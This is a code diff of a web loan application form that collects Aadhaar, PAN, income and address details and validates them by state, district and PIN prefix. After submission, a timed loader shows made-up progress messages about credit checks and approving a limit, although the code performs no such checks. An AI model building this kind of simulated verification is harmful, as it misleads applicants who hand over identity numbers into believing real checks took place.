@@ -20,6 +20,7 @@
             color: #333;
         }
 
+        /* Curved Header */
         .header {
             background-color: var(--primary-blue);
             color: white;
@@ -168,46 +169,26 @@
             <label>Select State</label>
             <select id="state-select">
                 <option value="">-- Choose State --</option>
-                <option value="Andhra Pradesh">Andhra Pradesh</option>
-                <option value="Arunachal Pradesh">Arunachal Pradesh</option>
-                <option value="Assam">Assam</option>
-                <option value="Bihar">Bihar</option>
-                <option value="Chhattisgarh">Chhattisgarh</option>
                 <option value="Delhi">Delhi</option>
-                <option value="Goa">Goa</option>
-                <option value="Gujarat">Gujarat</option>
-                <option value="Haryana">Haryana</option>
-                <option value="Himachal Pradesh">Himachal Pradesh</option>
-                <option value="Jharkhand">Jharkhand</option>
-                <option value="Karnataka">Karnataka</option>
-                <option value="Kerala">Kerala</option>
-                <option value="Madhya Pradesh">Madhya Pradesh</option>
-                <option value="Maharashtra">Maharashtra</option>
-                <option value="Manipur">Manipur</option>
-                <option value="Meghalaya">Meghalaya</option>
-                <option value="Mizoram">Mizoram</option>
-                <option value="Nagaland">Nagaland</option>
-                <option value="Odisha">Odisha</option>
-                <option value="Punjab">Punjab</option>
                 <option value="Rajasthan">Rajasthan</option>
-                <option value="Sikkim">Sikkim</option>
-                <option value="Tamil Nadu">Tamil Nadu</option>
-                <option value="Telangana">Telangana</option>
-                <option value="Tripura">Tripura</option>
                 <option value="Uttar Pradesh">Uttar Pradesh</option>
-                <option value="Uttarakhand">Uttarakhand</option>
+                <option value="Maharashtra">Maharashtra</option>
+                <option value="Punjab">Punjab</option>
+                <option value="Haryana">Haryana</option>
+                <option value="Gujarat">Gujarat</option>
+                <option value="Bihar">Bihar</option>
                 <option value="West Bengal">West Bengal</option>
             </select>
         </div>
 
         <div class="form-group">
-            <label>Address Line 1</label>
-            <input type="text" id="address1" placeholder="House No, Building, Street">
+            <label>Address Line 1 (Mohalla, School, Landmark)</label>
+            <input type="text" id="address1" placeholder="House No, Street, Landmark">
         </div>
 
         <div class="form-group">
-            <label>Address Line 2</label>
-            <input type="text" id="address2" placeholder="Locality, Village, Area">
+            <label>Address Line 2 (District/City/Tehsil)</label>
+            <input type="text" id="address2" placeholder="District or City name">
         </div>
 
         <div class="form-group">
@@ -295,19 +276,19 @@
         let selectedGender = '';
         let selectedEmp = '';
 
-        // Validation Database
-        const stateKeywords = {
-            "Rajasthan": ["jaipur", "jodhpur", "kota", "ajmer", "udaipur", "bikaner", "rajasthan", "alwar", "bhilwara", "gao", "village", "basti"],
-            "Delhi": ["delhi", "new delhi", "dwarka", "rohini", "saket", "laxmi nagar", "karol bagh", "ncr"],
-            "Maharashtra": ["mumbai", "pune", "nagpur", "thane", "nashik"],
-            "Uttar Pradesh": ["lucknow", "kanpur", "ghaziabad", "agra", "varanasi", "noida"]
+        // Validation Database (Strict for Line 2)
+        const districtDatabase = {
+            "Rajasthan": ["shriganganagar", "ganganagar", "jaipur", "jodhpur", "kota", "bikaner", "ajmer", "udaipur", "alwar", "bhilwara", "sikar", "pali", "hanumangarh"],
+            "Delhi": ["delhi", "new delhi", "dwarka", "rohini", "saket", "laxmi nagar", "najafgarh"],
+            "Uttar Pradesh": ["lucknow", "kanpur", "ghaziabad", "agra", "varanasi", "noida", "meerut"],
+            "Maharashtra": ["mumbai", "pune", "nagpur", "thane", "nashik", "aurangabad"]
         };
 
         const statePinPrefix = {
-            "Rajasthan": [30, 31, 32, 33, 34],
-            "Delhi": [11],
-            "Maharashtra": [40, 41, 42, 43, 44],
-            "Uttar Pradesh": [20, 21, 22, 23, 24, 25, 26, 27, 28]
+            "Delhi": [11], "Rajasthan": [30, 31, 32, 33, 34], "Punjab": [14, 15, 16],
+            "Haryana": [12, 13], "Uttar Pradesh": [20, 21, 22, 23, 24, 25, 26, 27, 28],
+            "Maharashtra": [40, 41, 42, 43, 44], "Gujarat": [36, 37, 38, 39],
+            "West Bengal": [70, 71, 72, 73, 74], "Bihar": [80, 81, 82, 83, 84, 85]
         };
 
         const d = [ [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 2, 3, 4, 0, 6, 7, 8, 9, 5], [2, 3, 4, 0, 1, 7, 8, 9, 5, 6], [3, 4, 0, 1, 2, 8, 9, 5, 6, 7], [4, 0, 1, 2, 3, 9, 5, 6, 7, 8], [5, 9, 8, 7, 6, 0, 4, 3, 2, 1], [6, 5, 9, 8, 7, 1, 0, 4, 3, 2], [7, 6, 5, 9, 8, 2, 1, 0, 4, 3], [8, 7, 6, 5, 9, 3, 2, 1, 0, 4], [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] ];
@@ -331,52 +312,46 @@
         }
 
         function validateForm() {
-            const fName = document.getElementById('first-name').value.trim();
-            const lName = document.getElementById('last-name').value.trim();
-            const mobile = document.getElementById('mobile').value;
-            const aadharInput = document.getElementById('aadhar');
-            const aadhar = aadharInput.value;
-            const pan = document.getElementById('pan').value.toUpperCase();
-            const dob = document.getElementById('dob').value;
-            const incomeVal = parseInt(document.getElementById('income').value) || 0;
-            const loanAmountVal = parseInt(document.getElementById('loan-amount').value) || 0;
             const state = document.getElementById('state-select').value;
-            const addr1 = document.getElementById('address1').value.toLowerCase();
-            const addr2 = document.getElementById('address2').value.toLowerCase();
-            const pincodeInput = document.getElementById('pincode');
-            const pincode = pincodeInput.value;
+            const addr1 = document.getElementById('address1').value.trim().toLowerCase();
+            const addr2 = document.getElementById('address2').value.trim().toLowerCase();
+            const pincode = document.getElementById('pincode').value;
+            const aadhar = document.getElementById('aadhar').value;
+            const income = parseInt(document.getElementById('income').value) || 0;
+            const loanAmount = parseInt(document.getElementById('loan-amount').value) || 0;
             const isAgreed = document.getElementById('agree').checked;
 
-            // State & Address Logic
-            let isAddressValid = addr1.length > 5 && addr2.length > 5;
-            let isPinValid = pincode.length === 6;
+            // Address Validation Logic
+            let isAddr1Valid = addr1.length >= 5 && !/^[0-9]+$/.test(addr1); // No only numbers
+            let isAddr2Valid = addr2.length >= 3;
 
-            if (stateKeywords[state]) {
-                const hasKeyword = stateKeywords[state].some(key => addr1.includes(key) || addr2.includes(key));
-                if (!hasKeyword) isAddressValid = false;
-                
-                const pinPrefix = parseInt(pincode.substring(0, 2));
-                const isPinPrefixValid = statePinPrefix[state].includes(pinPrefix);
-                if (!isPinPrefixValid) isPinValid = false;
+            // Strict District Check for Line 2
+            if (districtDatabase[state]) {
+                isAddr2Valid = districtDatabase[state].some(dist => addr2.includes(dist));
             }
 
-            // Visual feedback
-            document.getElementById('address1').classList.toggle('error-input', addr1.length > 0 && !isAddressValid);
-            document.getElementById('pincode').classList.toggle('error-input', pincode.length > 0 && !isPinValid);
-            
-            const isAadharValid = validateAadhar(aadhar);
-            aadharInput.classList.toggle('error-input', aadhar.length >= 12 && !isAadharValid);
+            // PIN vs State check
+            let isPinValid = pincode.length === 6;
+            if (statePinPrefix[state]) {
+                const prefix = parseInt(pincode.substring(0, 2));
+                if (!statePinPrefix[state].includes(prefix)) isPinValid = false;
+            }
 
-            const isMobileValid = mobile.length === 10;
-            const isPanValid = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
-            const isIncomeValid = incomeVal >= 10000 && incomeVal <= 80000;
-            const isAmountValid = loanAmountVal >= 10000 && loanAmountVal <= 500000 && loanAmountVal <= (incomeVal * 5);
+            const isAadharValid = validateAadhar(aadhar);
+            const isMobileValid = document.getElementById('mobile').value.length === 10;
+            const isPanValid = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(document.getElementById('pan').value.toUpperCase());
+            const isIncomeValid = income >= 10000 && income <= 80000;
+            const isAmountValid = loanAmount >= 10000 && loanAmount <= 500000 && loanAmount <= (income * 5);
+
+            // Error Visuals
+            document.getElementById('address2').classList.toggle('error-input', addr2.length > 2 && !isAddr2Valid);
+            document.getElementById('pincode').classList.toggle('error-input', pincode.length === 6 && !isPinValid);
+            document.getElementById('aadhar').classList.toggle('error-input', aadhar.length === 12 && !isAadharValid);
 
             const btn = document.getElementById('submit-btn');
 
-            if (isNameValid(fName, lName) && isMobileValid && isAadharValid && isPanValid && dob !== '' && 
-                isIncomeValid && isAmountValid && selectedGender !== '' && selectedEmp !== '' && 
-                isAgreed && state !== '' && isAddressValid && isPinValid) {
+            if (isAddr1Valid && isAddr2Valid && isPinValid && isAadharValid && isMobileValid && isPanValid && 
+                isIncomeValid && isAmountValid && selectedGender && selectedEmp && isAgreed && state) {
                 btn.classList.add('enabled');
                 return true;
             } else {
@@ -385,15 +360,13 @@
             }
         }
 
-        function isNameValid(f, l) { return f.length >= 2 && l.length >= 2; }
-
         function startProcessing() {
             if (!validateForm()) return;
             localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
             localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
             document.getElementById('loader-overlay').style.display = 'flex';
             let i = 0;
-            const steps = ["Verifying address records...", "Validating government documentation...", "Checking credit history...", "Finalizing approval..."];
+            const steps = ["Checking address authenticity...", "Verifying document checksum...", "Analyzing credit profile...", "Approving final limit..."];
             const interval = setInterval(() => {
                 if (i < steps.length) document.getElementById('loader-text').innerText = steps[i++];
                 else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
